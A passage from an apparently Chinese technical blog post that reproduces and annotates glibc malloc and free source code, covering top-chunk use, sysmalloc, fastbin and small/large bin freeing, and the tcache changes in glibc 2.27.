remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">               <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                 av-&gt;last_remainder = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))<span class="comment">//再触发consolidate</span></span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="堆未初始化"><a href="#堆未初始化" class="headerlink" title="堆未初始化"></a>堆未初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);<span class="comment">//计算索引</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>fastbin在free的时候是不检测周边chunk的情况的,直接放入不进行其他操作</p><h3 id="smallbin-amp-amp-largebin"><a href="#smallbin-amp-amp-largebin" class="headerlink" title="smallbin&amp;&amp;largebin"></a>smallbin&amp;&amp;largebin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//进行了一系列的检测</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//清除p位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);<span class="comment">//统一放入unsortedbin</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;<span class="comment">//largebin清空nextsize链</span></span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;<span class="comment">//fd,bk链设置</span></span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);<span class="comment">//设置p位</span></span><br><span class="line">      set_foot(p, size);<span class="comment">//设置下一个chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//nextchunk是topchunk的情况</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);<span class="comment">//触发malloc_consolidate</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))<span class="comment">//收缩堆</span></span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><p>变化比较大的就是多了个tcache</p><h2 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc变化"><a href="#libc变化" class="headerlink" title="libc变化"></a>libc变化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在_libc_malloc中添加了tcache操作,可以直接在_libc_malloc获得chunk返回</p><h3 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h3><p>fastbin比较大的变化是移除fastchunk的操作会因为操作线程做区分</p><p>其中一个由一个宏完成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);</span></span><br></pre></td></tr></table></figure><h3 id="tcache填充机制"><a href="#tcache填充机制" class="headerlink" title="tcache填充机制"></a>tcache填充机制</h3><p><strong>fastbin</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">     <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">     <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span 